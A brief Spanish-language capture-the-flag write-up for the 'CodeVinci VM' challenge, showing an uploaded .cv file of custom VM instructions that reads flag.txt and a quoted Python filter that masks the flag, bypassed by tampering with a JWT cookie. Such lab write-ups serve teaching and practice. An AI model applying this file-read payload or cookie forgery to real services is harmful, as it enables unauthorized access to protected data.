Se nos dispone del archivo:
  vm.py

Al analizarlo podemos ver unas funciones a destacar:
- READ_NEXT_LINE
- PUSH

Al analizar la web, podemos subir archivo con extension cv

Subimos un archivo exploit.cv:
```
  PUSH flag.txt
  READ_NEXT_LINE
  PRINT
  READ_NEXT_LINE
  PRINT
  READ_NEXT_LINE
  PRINT
  READ_NEXT_LINE
  PRINT
```

![alt text](https://github.com/Rojo-On1/CTF-Book/blob/main/CTF-Contest/CodeVinciCTF/Binary/CodeVinci%20VM/images/functions.png)

Al revisa podemos ver el contenido de flag.txt sin embargo no podemos ver la flag; 
Aun asi podemos revisar al archivo app.py y vemos la funcion proxy

```python
def simple_proxy(output):
  flag_pattern = r"CodeVinciCTF\{[A-Za-z0-9_]+\}"
  emoji = "🚩"
  return re.sub(flag_pattern, emoji, output)

if not is_authenticated:
  output = simple_proxy(output)
```

Interceptamos el envio de la flag y modificamos la cookie en JWT para poder ver la FLAG



